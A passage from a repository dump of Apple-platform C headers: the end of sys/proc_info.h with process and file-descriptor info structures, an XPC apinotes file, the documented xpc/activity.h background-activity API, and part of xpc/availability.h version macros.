	off_t           vst_size;       /* [XSI] file size, in bytes */
	int64_t         vst_blocks;     /* [XSI] blocks allocated for file */
	int32_t         vst_blksize;    /* [XSI] optimal blocksize for I/O */
	uint32_t        vst_flags;      /* user defined flags for file */
	uint32_t        vst_gen;        /* file generation number */
	uint32_t        vst_rdev;       /* [XSI] Device ID */
	int64_t         vst_qspare[2];  /* RESERVED: DO NOT USE! */
};

struct vnode_info {
	struct vinfo_stat       vi_stat;
	int                     vi_type;
	int                     vi_pad;
	fsid_t                  vi_fsid;
};

struct vnode_info_path {
	struct vnode_info       vip_vi;
	char                    vip_path[MAXPATHLEN];   /* tail end of it  */
};

struct vnode_fdinfo {
	struct proc_fileinfo    pfi;
	struct vnode_info       pvi;
};

struct vnode_fdinfowithpath {
	struct proc_fileinfo    pfi;
	struct vnode_info_path  pvip;
};

struct proc_regionwithpathinfo {
	struct proc_regioninfo  prp_prinfo;
	struct vnode_info_path  prp_vip;
};

struct proc_regionpath {
	uint64_t prpo_addr;
	uint64_t prpo_regionlength;
	char prpo_path[MAXPATHLEN];
};

struct proc_vnodepathinfo {
	struct vnode_info_path  pvi_cdir;
	struct vnode_info_path  pvi_rdir;
};

struct proc_threadwithpathinfo {
	struct proc_threadinfo  pt;
	struct vnode_info_path  pvip;
};


struct psem_info {
	struct vinfo_stat       psem_stat;
	char                    psem_name[MAXPATHLEN];
};

struct psem_fdinfo {
	struct proc_fileinfo    pfi;
	struct psem_info        pseminfo;
};



struct pshm_info  {
	struct vinfo_stat       pshm_stat;
	uint64_t                pshm_mappaddr;
	char                    pshm_name[MAXPATHLEN];
};

struct pshm_fdinfo {
	struct proc_fileinfo    pfi;
	struct pshm_info        pshminfo;
};


struct pipe_info {
	struct vinfo_stat       pipe_stat;
	uint64_t                pipe_handle;
	uint64_t                pipe_peerhandle;
	int                     pipe_status;
	int                     rfu_1;  /* reserved */
};

struct pipe_fdinfo {
	struct proc_fileinfo    pfi;
	struct pipe_info        pipeinfo;
};


struct kqueue_info {
	struct vinfo_stat       kq_stat;
	uint32_t                kq_state;
	uint32_t                rfu_1;  /* reserved */
};

struct kqueue_dyninfo {
	struct kqueue_info kqdi_info;
	uint64_t kqdi_servicer;
	uint64_t kqdi_owner;
	uint32_t kqdi_sync_waiters;
	uint8_t  kqdi_sync_waiter_qos;
	uint8_t  kqdi_async_qos;
	uint16_t kqdi_request_state;
	uint8_t  kqdi_events_qos;
	uint8_t  kqdi_pri;
	uint8_t  kqdi_pol;
	uint8_t  kqdi_cpupercent;
	uint8_t  _kqdi_reserved0[4];
	uint64_t _kqdi_reserved1[4];
};

/* keep in sync with KQ_* in sys/eventvar.h */
#define PROC_KQUEUE_SELECT      0x0001
#define PROC_KQUEUE_SLEEP       0x0002
#define PROC_KQUEUE_32          0x0008
#define PROC_KQUEUE_64          0x0010
#define PROC_KQUEUE_QOS         0x0020

struct kqueue_fdinfo {
	struct proc_fileinfo    pfi;
	struct kqueue_info      kqueueinfo;
};

struct appletalk_info {
	struct vinfo_stat       atalk_stat;
};

struct appletalk_fdinfo {
	struct proc_fileinfo    pfi;
	struct appletalk_info   appletalkinfo;
};

typedef uint64_t proc_info_udata_t;

/* defns of process file desc type */
#define PROX_FDTYPE_ATALK       0
#define PROX_FDTYPE_VNODE       1
#define PROX_FDTYPE_SOCKET      2
#define PROX_FDTYPE_PSHM        3
#define PROX_FDTYPE_PSEM        4
#define PROX_FDTYPE_KQUEUE      5
#define PROX_FDTYPE_PIPE        6
#define PROX_FDTYPE_FSEVENTS    7
#define PROX_FDTYPE_NETPOLICY   9
#define PROX_FDTYPE_CHANNEL     10
#define PROX_FDTYPE_NEXUS       11

struct proc_fdinfo {
	int32_t                 proc_fd;
	uint32_t                proc_fdtype;
};

struct proc_fileportinfo {
	uint32_t                proc_fileport;
	uint32_t                proc_fdtype;
};

/*
 * Channel
 */

/* type */
#define PROC_CHANNEL_TYPE_USER_PIPE             0
#define PROC_CHANNEL_TYPE_KERNEL_PIPE           1
#define PROC_CHANNEL_TYPE_NET_IF                2
#define PROC_CHANNEL_TYPE_FLOW_SWITCH           3

/* flags */
#define PROC_CHANNEL_FLAGS_MONITOR_TX           0x1
#define PROC_CHANNEL_FLAGS_MONITOR_RX           0x2
#define PROC_CHANNEL_FLAGS_MONITOR_NO_COPY      0x4
#define PROC_CHANNEL_FLAGS_EXCLUSIVE            0x10
#define PROC_CHANNEL_FLAGS_USER_PACKET_POOL     0x20
#define PROC_CHANNEL_FLAGS_DEFUNCT_OK           0x40
#define PROC_CHANNEL_FLAGS_LOW_LATENCY          0x80
#define PROC_CHANNEL_FLAGS_MONITOR                                      \
	(PROC_CHANNEL_FLAGS_MONITOR_TX | PROC_CHANNEL_FLAGS_MONITOR_RX)

struct proc_channel_info {
	uuid_t                  chi_instance;
	uint32_t                chi_port;
	uint32_t                chi_type;
	uint32_t                chi_flags;
	uint32_t                rfu_1;/* reserved */
};

struct channel_fdinfo {
	struct proc_fileinfo    pfi;
	struct proc_channel_info channelinfo;
};

/* Flavors for proc_pidinfo() */
#define PROC_PIDLISTFDS                 1
#define PROC_PIDLISTFD_SIZE             (sizeof(struct proc_fdinfo))

#define PROC_PIDTASKALLINFO             2
#define PROC_PIDTASKALLINFO_SIZE        (sizeof(struct proc_taskallinfo))

#define PROC_PIDTBSDINFO                3
#define PROC_PIDTBSDINFO_SIZE           (sizeof(struct proc_bsdinfo))

#define PROC_PIDTASKINFO                4
#define PROC_PIDTASKINFO_SIZE           (sizeof(struct proc_taskinfo))

#define PROC_PIDTHREADINFO              5
#define PROC_PIDTHREADINFO_SIZE         (sizeof(struct proc_threadinfo))

#define PROC_PIDLISTTHREADS             6
#define PROC_PIDLISTTHREADS_SIZE        (2* sizeof(uint32_t))

#define PROC_PIDREGIONINFO              7
#define PROC_PIDREGIONINFO_SIZE         (sizeof(struct proc_regioninfo))

#define PROC_PIDREGIONPATHINFO          8
#define PROC_PIDREGIONPATHINFO_SIZE     (sizeof(struct proc_regionwithpathinfo))

#define PROC_PIDVNODEPATHINFO           9
#define PROC_PIDVNODEPATHINFO_SIZE      (sizeof(struct proc_vnodepathinfo))

#define PROC_PIDTHREADPATHINFO          10
#define PROC_PIDTHREADPATHINFO_SIZE     (sizeof(struct proc_threadwithpathinfo))

#define PROC_PIDPATHINFO                11
#define PROC_PIDPATHINFO_SIZE           (MAXPATHLEN)
#define PROC_PIDPATHINFO_MAXSIZE        (4*MAXPATHLEN)

#define PROC_PIDWORKQUEUEINFO           12
#define PROC_PIDWORKQUEUEINFO_SIZE      (sizeof(struct proc_workqueueinfo))

#define PROC_PIDT_SHORTBSDINFO          13
#define PROC_PIDT_SHORTBSDINFO_SIZE     (sizeof(struct proc_bsdshortinfo))

#define PROC_PIDLISTFILEPORTS           14
#define PROC_PIDLISTFILEPORTS_SIZE      (sizeof(struct proc_fileportinfo))

#define PROC_PIDTHREADID64INFO          15
#define PROC_PIDTHREADID64INFO_SIZE     (sizeof(struct proc_threadinfo))

#define PROC_PID_RUSAGE                 16
#define PROC_PID_RUSAGE_SIZE            0

/* Flavors for proc_pidfdinfo */

#define PROC_PIDFDVNODEINFO             1
#define PROC_PIDFDVNODEINFO_SIZE        (sizeof(struct vnode_fdinfo))

#define PROC_PIDFDVNODEPATHINFO         2
#define PROC_PIDFDVNODEPATHINFO_SIZE    (sizeof(struct vnode_fdinfowithpath))

#define PROC_PIDFDSOCKETINFO            3
#define PROC_PIDFDSOCKETINFO_SIZE       (sizeof(struct socket_fdinfo))

#define PROC_PIDFDPSEMINFO              4
#define PROC_PIDFDPSEMINFO_SIZE         (sizeof(struct psem_fdinfo))

#define PROC_PIDFDPSHMINFO              5
#define PROC_PIDFDPSHMINFO_SIZE         (sizeof(struct pshm_fdinfo))

#define PROC_PIDFDPIPEINFO              6
#define PROC_PIDFDPIPEINFO_SIZE         (sizeof(struct pipe_fdinfo))

#define PROC_PIDFDKQUEUEINFO            7
#define PROC_PIDFDKQUEUEINFO_SIZE       (sizeof(struct kqueue_fdinfo))

#define PROC_PIDFDATALKINFO             8
#define PROC_PIDFDATALKINFO_SIZE        (sizeof(struct appletalk_fdinfo))


#define PROC_PIDFDCHANNELINFO           10
#define PROC_PIDFDCHANNELINFO_SIZE      (sizeof(struct channel_fdinfo))

/* Flavors for proc_pidfileportinfo */

#define PROC_PIDFILEPORTVNODEPATHINFO   2       /* out: vnode_fdinfowithpath */
#define PROC_PIDFILEPORTVNODEPATHINFO_SIZE      \
	                                PROC_PIDFDVNODEPATHINFO_SIZE

#define PROC_PIDFILEPORTSOCKETINFO      3       /* out: socket_fdinfo */
#define PROC_PIDFILEPORTSOCKETINFO_SIZE PROC_PIDFDSOCKETINFO_SIZE

#define PROC_PIDFILEPORTPSHMINFO        5       /* out: pshm_fdinfo */
#define PROC_PIDFILEPORTPSHMINFO_SIZE   PROC_PIDFDPSHMINFO_SIZE

#define PROC_PIDFILEPORTPIPEINFO        6       /* out: pipe_fdinfo */
#define PROC_PIDFILEPORTPIPEINFO_SIZE   PROC_PIDFDPIPEINFO_SIZE

/* used for proc_setcontrol */
#define PROC_SELFSET_PCONTROL           1

#define PROC_SELFSET_THREADNAME         2
#define PROC_SELFSET_THREADNAME_SIZE    (MAXTHREADNAMESIZE -1)

#define PROC_SELFSET_VMRSRCOWNER        3

#define PROC_SELFSET_DELAYIDLESLEEP     4

/* used for proc_dirtycontrol */
#define PROC_DIRTYCONTROL_TRACK         1
#define PROC_DIRTYCONTROL_SET           2
#define PROC_DIRTYCONTROL_GET           3
#define PROC_DIRTYCONTROL_CLEAR         4

/* proc_track_dirty() flags */
#define PROC_DIRTY_TRACK                0x1
#define PROC_DIRTY_ALLOW_IDLE_EXIT      0x2
#define PROC_DIRTY_DEFER                0x4
#define PROC_DIRTY_LAUNCH_IN_PROGRESS   0x8
#define PROC_DIRTY_DEFER_ALWAYS         0x10

/* proc_get_dirty() flags */
#define PROC_DIRTY_TRACKED              0x1
#define PROC_DIRTY_ALLOWS_IDLE_EXIT     0x2
#define PROC_DIRTY_IS_DIRTY             0x4
#define PROC_DIRTY_LAUNCH_IS_IN_PROGRESS   0x8

/* Flavors for proc_udata_info */
#define PROC_UDATA_INFO_GET             1
#define PROC_UDATA_INFO_SET             2

__END_DECLS


#endif /*_SYS_PROC_INFO_H */
```

`BaseBin/_external/include/xpc/XPC.apinotes`:

```apinotes
Name: XPC
Functions:
# xpc_object
- Name: xpc_retain
  Availability: nonswift
- Name: xpc_release
  Availability: nonswift

```

`BaseBin/_external/include/xpc/activity.h`:

```h
#ifndef __XPC_ACTIVITY_H__
#define __XPC_ACTIVITY_H__

#ifndef __XPC_INDIRECT__
#error "Please #include <xpc/xpc.h> instead of this file directly."
// For HeaderDoc.
#include <xpc/base.h>
#endif // __XPC_INDIRECT__ 

#ifdef __BLOCKS__

XPC_ASSUME_NONNULL_BEGIN
__BEGIN_DECLS

/*
 * The following are a collection of keys and values used to set an activity's
 * execution criteria.
 */

/*!
 * @constant XPC_ACTIVITY_INTERVAL
 * An integer property indicating the desired time interval (in seconds) of the 
 * activity. The activity will not be run more than once per time interval.
 * Due to the nature of XPC Activity finding an opportune time to run
 * the activity, any two occurrences may be more or less than 'interval'
 * seconds apart, but on average will be 'interval' seconds apart.
 * The presence of this key implies the following, unless overridden:
 * - XPC_ACTIVITY_REPEATING with a value of true
 * - XPC_ACTIVITY_DELAY with a value of half the 'interval'
 *   The delay enforces a minimum distance between any two occurrences.
 * - XPC_ACTIVITY_GRACE_PERIOD with a value of half the 'interval'.
 *   The grace period is the amount of time allowed to pass after the end of
 *   the interval before more aggressive scheduling occurs. The grace period
 *   does not increase the size of the interval.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const char * const XPC_ACTIVITY_INTERVAL;

/*!
 * @constant XPC_ACTIVITY_REPEATING
 * A boolean property indicating whether this is a repeating activity.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const char * const XPC_ACTIVITY_REPEATING;

/*!
 * @constant XPC_ACTIVITY_DELAY
 * An integer property indicating the number of seconds to delay before
 * beginning the activity.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const char * const XPC_ACTIVITY_DELAY;

/*!
 * @constant XPC_ACTIVITY_GRACE_PERIOD
 * An integer property indicating the number of seconds to allow as a grace
 * period before the scheduling of the activity becomes more aggressive.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const char * const XPC_ACTIVITY_GRACE_PERIOD;


__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const int64_t XPC_ACTIVITY_INTERVAL_1_MIN;

__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const int64_t XPC_ACTIVITY_INTERVAL_5_MIN;

__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const int64_t XPC_ACTIVITY_INTERVAL_15_MIN;

__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const int64_t XPC_ACTIVITY_INTERVAL_30_MIN;

__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const int64_t XPC_ACTIVITY_INTERVAL_1_HOUR;

__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const int64_t XPC_ACTIVITY_INTERVAL_4_HOURS;

__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const int64_t XPC_ACTIVITY_INTERVAL_8_HOURS;

__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const int64_t XPC_ACTIVITY_INTERVAL_1_DAY;

__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const int64_t XPC_ACTIVITY_INTERVAL_7_DAYS;

/*!
 * @constant XPC_ACTIVITY_PRIORITY
 * A string property indicating the priority of the activity.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const char * const XPC_ACTIVITY_PRIORITY;

/*!
 * @constant XPC_ACTIVITY_PRIORITY_MAINTENANCE
 * A string indicating activity is maintenance priority.
 *
 * Maintenance priority is intended for user-invisible maintenance tasks
 * such as garbage collection or optimization.
 *
 * Maintenance activities are not permitted to run if the device thermal
 * condition exceeds a nominal level or if the battery level is lower than 20%.
 * In Low Power Mode (on supported devices), maintenance activities are not
 * permitted to run while the device is on battery, or plugged in and the
 * battery level is lower than 30%.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const char * const XPC_ACTIVITY_PRIORITY_MAINTENANCE;

/*!
 * @constant XPC_ACTIVITY_PRIORITY_UTILITY
 * A string indicating activity is utility priority.
 *
 * Utility priority is intended for user-visible tasks such as fetching data
 * from the network, copying files, or importing data.
 *
 * Utility activities are not permitted to run if the device thermal condition
 * exceeds a moderate level or if the battery level is less than 10%.  In Low
 * Power Mode (on supported devices) when on battery power, utility activities
 * are only permitted when they are close to their deadline (90% of their time
 * window has elapsed).
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const char * const XPC_ACTIVITY_PRIORITY_UTILITY;

/*!
 * @constant XPC_ACTIVITY_ALLOW_BATTERY
 * A Boolean value indicating whether the activity should be allowed to run
 * while the computer is on battery power. The default value is false for
 * maintenance priority activity and true for utility priority activity.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const char * const XPC_ACTIVITY_ALLOW_BATTERY;

/*!
 * @constant XPC_ACTIVITY_REQUIRE_SCREEN_SLEEP
 * A Boolean value indicating whether the activity should only be performed
 * while device appears to be asleep.  Note that the definition of screen sleep
 * may vary by platform and may include states where the device is known to be
 * idle despite the fact that the display itself is still powered.  Defaults to
 * false.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const char * const XPC_ACTIVITY_REQUIRE_SCREEN_SLEEP; // bool

/*!
 * @constant XPC_ACTIVITY_PREVENT_DEVICE_SLEEP
 * A Boolean value indicating whether the activity should prevent system sleep while
 * running on battery.
 * If this property is set, the activity scheduler will take the appropriate power
 * assertion to keep the device (but not the screen) awake while the activity is running.
 * Only activities which perform critical system functions that do not want to be
 * interrupted by system sleep should set this.
 * Setting this property can impact battery life.
 */
__API_AVAILABLE(macos(12.0), ios(15.0), watchos(8.0))
XPC_EXPORT
const char * const XPC_ACTIVITY_PREVENT_DEVICE_SLEEP; // bool

/*!
 * @constant XPC_ACTIVITY_REQUIRE_BATTERY_LEVEL
 * An integer percentage of minimum battery charge required to allow the
 * activity to run. A default minimum battery level is determined by the
 * system.
 */
__OSX_AVAILABLE_BUT_DEPRECATED_MSG(__MAC_10_9, __MAC_10_9, __IPHONE_7_0, __IPHONE_7_0,
	"REQUIRE_BATTERY_LEVEL is not implemented")
XPC_EXPORT
const char * const XPC_ACTIVITY_REQUIRE_BATTERY_LEVEL; // int (%)

/*!
 * @constant XPC_ACTIVITY_REQUIRE_HDD_SPINNING
 * A Boolean value indicating whether the activity should only be performed
 * while the hard disk drive (HDD) is spinning. Computers with flash storage
 * are considered to be equivalent to HDD spinning. Defaults to false.
 */
__OSX_AVAILABLE_BUT_DEPRECATED_MSG(__MAC_10_9, __MAC_10_9, __IPHONE_7_0, __IPHONE_7_0,
	"REQUIRE_HDD_SPINNING is not implemented")
XPC_EXPORT
const char * const XPC_ACTIVITY_REQUIRE_HDD_SPINNING; // bool

/*!
 * @define XPC_TYPE_ACTIVITY
 * A type representing the XPC activity object.
 */
#define XPC_TYPE_ACTIVITY (&_xpc_type_activity)
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_activity);

/*!
 * @typedef xpc_activity_t
 *
 * @abstract
 * An XPC activity object.
 *
 * @discussion
 * This object represents a set of execution criteria and a current execution
 * state for background activity on the system. Once an activity is registered,
 * the system will evaluate its criteria to determine whether the activity is
 * eligible to run under current system conditions. When an activity becomes
 * eligible to run, its execution state will be updated and an invocation of
 * its handler block will be made.
 */
XPC_DECL(xpc_activity);

/*!
 * @typedef xpc_activity_handler_t
 *
 * @abstract
 * A block that is called when an XPC activity becomes eligible to run.
 */
XPC_NONNULL1
typedef void (^xpc_activity_handler_t)(xpc_activity_t activity);

/*!
 * @constant XPC_ACTIVITY_CHECK_IN
 * This constant may be passed to xpc_activity_register() as the criteria
 * dictionary in order to check in with the system for previously registered
 * activity using the same identifier (for example, an activity taken from a
 * launchd property list).
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT
const xpc_object_t XPC_ACTIVITY_CHECK_IN;

/*!
 * @function xpc_activity_register
 *
 * @abstract
 * Registers an activity with the system.
 *
 * @discussion
 * Registers a new activity with the system. The criteria of the activity are
 * described by the dictionary passed to this function. If an activity with the
 * same identifier already exists, the criteria provided override the existing
 * criteria unless the special dictionary XPC_ACTIVITY_CHECK_IN is used. The
 * XPC_ACTIVITY_CHECK_IN dictionary instructs the system to first look up an
 * existing activity without modifying its criteria. Once the existing activity
 * is found (or a new one is created with an empty set of criteria) the handler
 * will be called with an activity object in the XPC_ACTIVITY_STATE_CHECK_IN
 * state.
 *
 * @param identifier
 * A unique identifier for the activity. Each application has its own namespace.
 * The identifier should remain constant across registrations, relaunches of
 * the application, and reboots. It should identify the kind of work being done,
 * not a particular invocation of the work.
 *
 * @param criteria
 * A dictionary of criteria for the activity.
 *
 * @param handler
 * The handler block to be called when the activity changes state to one of the
 * following states:
 * - XPC_ACTIVITY_STATE_CHECK_IN (optional)
 * - XPC_ACTIVITY_STATE_RUN
 *
 * The handler block is never invoked reentrantly. It will be invoked on a
 * dispatch queue with an appropriate priority to perform the activity.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL2 XPC_NONNULL3
void
xpc_activity_register(const char *identifier, xpc_object_t criteria,
	xpc_activity_handler_t handler);

/*!
 * @function xpc_activity_copy_criteria
 *
 * @abstract
 * Returns an XPC dictionary describing the execution criteria of an activity.
 * This will return NULL in cases where the activity has already completed, e.g.
 * when checking in to an event that finished and was not rescheduled.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT XPC_WARN_RESULT XPC_RETURNS_RETAINED XPC_NONNULL1
xpc_object_t _Nullable
xpc_activity_copy_criteria(xpc_activity_t activity);

/*!
 * @function xpc_activity_set_criteria
 *
 * @abstract
 * Modifies the execution criteria of an activity.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL2
void
xpc_activity_set_criteria(xpc_activity_t activity, xpc_object_t criteria);

/*!
 * @enum xpc_activity_state_t
 * An activity is defined to be in one of the following states. Applications
 * may check the current state of the activity using xpc_activity_get_state()
 * in the handler block provided to xpc_activity_register().
 *
 * The application can modify the state of the activity by calling
 * xpc_activity_set_state() with one of the following:
 * - XPC_ACTIVITY_STATE_DEFER
 * - XPC_ACTIVITY_STATE_CONTINUE
 * - XPC_ACTIVITY_STATE_DONE
 *
 * @constant XPC_ACTIVITY_STATE_CHECK_IN
 * An activity in this state has just completed a checkin with the system after
 * XPC_ACTIVITY_CHECK_IN was provided as the criteria dictionary to
 * xpc_activity_register. The state gives the application an opportunity to
 * inspect and modify the activity's criteria.
 *
 * @constant XPC_ACTIVITY_STATE_WAIT
 * An activity in this state is waiting for an opportunity to run. This value
 * is never returned within the activity's handler block, as the block is
 * invoked in response to XPC_ACTIVITY_STATE_CHECK_IN or XPC_ACTIVITY_STATE_RUN.
 *
 * Note:
 * A launchd job may idle exit while an activity is in the wait state and be
 * relaunched in response to the activity becoming runnable. The launchd job
 * simply needs to re-register for the activity on its next launch by passing
 * XPC_ACTIVITY_STATE_CHECK_IN to xpc_activity_register().
 *
 * @constant XPC_ACTIVITY_STATE_RUN
 * An activity in this state is eligible to run based on its criteria.
 *
 * @constant XPC_ACTIVITY_STATE_DEFER
 * An application may pass this value to xpc_activity_set_state() to indicate
 * that the activity should be deferred (placed back into the WAIT state) until
 * a time when its criteria are met again. Deferring an activity does not reset
 * any of its time-based criteria (in other words, it will remain past due).
 *
 * IMPORTANT:
 * This should be done in response to observing xpc_activity_should_defer().
 * It should not be done unilaterally. If you determine that conditions are bad
 * to do your activity's work for reasons you can't express in a criteria
 * dictionary, you should set the activity's state to XPC_ACTIVITY_STATE_DONE.
 *
 *
 * @constant XPC_ACTIVITY_STATE_CONTINUE
 * An application may pass this value to xpc_activity_set_state() to indicate
 * that the activity will continue its operation beyond the return of its
 * handler block. This can be used to extend an activity to include asynchronous
 * operations. The activity's handler block will not be invoked again until the
 * state has been updated to either XPC_ACTIVITY_STATE_DEFER or, in the case
 * of repeating activity, XPC_ACTIVITY_STATE_DONE.
 *
 * @constant XPC_ACTIVITY_STATE_DONE
 * An application may pass this value to xpc_activity_set_state() to indicate
 * that the activity has completed. For non-repeating activity, the resources
 * associated with the activity will be automatically released upon return from
 * the handler block. For repeating activity, timers present in the activity's
 * criteria will be reset.
 */
enum {
	XPC_ACTIVITY_STATE_CHECK_IN,
	XPC_ACTIVITY_STATE_WAIT,
	XPC_ACTIVITY_STATE_RUN,
	XPC_ACTIVITY_STATE_DEFER,
	XPC_ACTIVITY_STATE_CONTINUE,
	XPC_ACTIVITY_STATE_DONE,
};
typedef long xpc_activity_state_t;

/*!
 * @function xpc_activity_get_state
 *
 * @abstract
 * Returns the current state of an activity.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
xpc_activity_state_t
xpc_activity_get_state(xpc_activity_t activity);

/*!
 * @function xpc_activity_set_state
 *
 * @abstract
 * Updates the current state of an activity.
 *
 * @return
 * Returns true if the state was successfully updated; otherwise, returns
 * false if the requested state transition is not valid.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
bool
xpc_activity_set_state(xpc_activity_t activity, xpc_activity_state_t state);

/*!
 * @function xpc_activity_should_defer
 *
 * @abstract
 * Test whether an activity should be deferred.
 *
 * @discussion
 * This function may be used to test whether the criteria of a long-running
 * activity are still satisfied. If not, the system indicates that the
 * application should defer the activity. The application may acknowledge the
 * deferral by calling xpc_activity_set_state() with XPC_ACTIVITY_STATE_DEFER.
 * Once deferred, the system will place the activity back into the WAIT state
 * and re-invoke the handler block at the earliest opportunity when the criteria
 * are once again satisfied.
 *
 * @return
 * Returns true if the activity should be deferred.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
bool
xpc_activity_should_defer(xpc_activity_t activity);

/*!
 * @function xpc_activity_unregister
 *
 * @abstract
 * Unregisters an activity found by its identifier.
 *
 * @discussion
 * A dynamically registered activity will be deleted in response to this call.
 * Statically registered activity (from a launchd property list) will be
 * deleted until the job is next loaded (e.g. at next boot).
 *
 * Unregistering an activity has no effect on any outstanding xpc_activity_t
 * objects or any currently executing xpc_activity_handler_t blocks; however,
 * no new handler block invocations will be made after it is unregistered.
 *
 * @param identifier
 * The identifier of the activity to unregister.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
XPC_EXPORT XPC_NONNULL1
void
xpc_activity_unregister(const char *identifier);

__END_DECLS
XPC_ASSUME_NONNULL_END

#endif // __BLOCKS__

#endif // __XPC_ACTIVITY_H__ 


```

`BaseBin/_external/include/xpc/availability.h`:

```h
#ifndef __XPC_AVAILABILITY_H__
#define __XPC_AVAILABILITY_H__

#include <Availability.h>

// Certain parts of the project use all the project's headers but have to build
// against newer OSX SDKs than ebuild uses -- liblaunch_host being the example.
// So we need to define these.
#ifndef __MAC_10_16
#define __MAC_10_16 101600
#endif // __MAC_10_16

#ifndef __MAC_10_15
#define __MAC_10_15 101500
#define __AVAILABILITY_INTERNAL__MAC_10_15 \
__attribute__((availability(macosx, introduced=10.15)))
#endif // __MAC_10_15

#ifndef __MAC_10_14
#define __MAC_10_14 101400
#define __AVAILABILITY_INTERNAL__MAC_10_14 \
__attribute__((availability(macosx, introduced=10.14)))
#endif // __MAC_10_14

#ifndef __MAC_10_13
#define __MAC_10_13 101300
#define __AVAILABILITY_INTERNAL__MAC_10_13 \
	__attribute__((availability(macosx, introduced=10.13)))
#endif // __MAC_10_13

#ifndef __MAC_10_12
#define __MAC_10_12 101200
#define __AVAILABILITY_INTERNAL__MAC_10_12 \
	__attribute__((availability(macosx, introduced=10.12)))
#endif // __MAC_10_12

#ifndef __MAC_10_11
#define __MAC_10_11 101100
#define __AVAILABILITY_INTERNAL__MAC_10_11 \
	__attribute__((availability(macosx, introduced=10.11)))
#endif // __MAC_10_11

#ifndef __MAC_12_0
#define __MAC_12_0 120000
#define __AVAILABILITY_INTERNAL__MAC_12_0 \
	__attribute__((availability(macosx, introduced=12.0)))
#endif // __MAC_12_0

#ifndef __MAC_13_3
#define __MAC_13_3 130300
#endif // __MAC_13_3

#ifndef __AVAILABILITY_INTERNAL__MAC_10_2_DEP__MAC_10_11
#define __AVAILABILITY_INTERNAL__MAC_10_2_DEP__MAC_10_11
#endif // __AVAILABILITY_INTERNAL__MAC_10_2_DEP__MAC_10_11

#ifndef __AVAILABILITY_INTERNAL__MAC_10_3_DEP__MAC_10_11
#define __AVAILABILITY_INTERNAL__MAC_10_3_DEP__MAC_10_11
#endif // __AVAILABILITY_INTERNAL__MAC_10_3_DEP__MAC_10_11

#ifndef __AVAILABILITY_INTERNAL__MAC_10_4_DEP__MAC_10_11
#define __AVAILABILITY_INTERNAL__MAC_10_4_DEP__MAC_10_11
#endif // __AVAILABILITY_INTERNAL__MAC_10_4_DEP__MAC_10_11

#ifndef __AVAILABILITY_INTERNAL__MAC_10_5_DEP__MAC_10_11
#define __AVAILABILITY_INTERNAL__MAC_10_5_DEP__MAC_10_11
#endif // __AVAILABILITY_INTERNAL__MAC_10_5_DEP__MAC_10_11

#ifndef __AVAILABILITY_INTERNAL__MAC_10_6_DEP__MAC_10_11
#define __AVAILABILITY_INTERNAL__MAC_10_6_DEP__MAC_10_11
#endif // __AVAILABILITY_INTERNAL__MAC_10_6_DEP__MAC_10_11

#ifndef __AVAILABILITY_INTERNAL__MAC_10_7_DEP__MAC_10_11
#define __AVAILABILITY_INTERNAL__MAC_10_7_DEP__MAC_10_11
#endif // __AVAILABILITY_INTERNAL__MAC_10_7_DEP__MAC_10_11

#ifndef __AVAILABILITY_INTERNAL__MAC_10_8_DEP__MAC_10_11
#define __AVAILABILITY_INTERNAL__MAC_10_8_DEP__MAC_10_11
#endif // __AVAILABILITY_INTERNAL__MAC_10_8_DEP__MAC_10_11

#ifndef __AVAILABILITY_INTERNAL__MAC_10_9_DEP__MAC_10_11
#define __AVAILABILITY_INTERNAL__MAC_10_9_DEP__MAC_10_11
#endif // __AVAILABILITY_INTERNAL__MAC_10_9_DEP__MAC_10_11

#ifndef __AVAILABILITY_INTERNAL__MAC_10_10_DEP__MAC_10_11
#define __AVAILABILITY_INTERNAL__MAC_10_10_DEP__MAC_10_11
#endif // __AVAILABILITY_INTERNAL__MAC_10_10_DEP__MAC_10_11

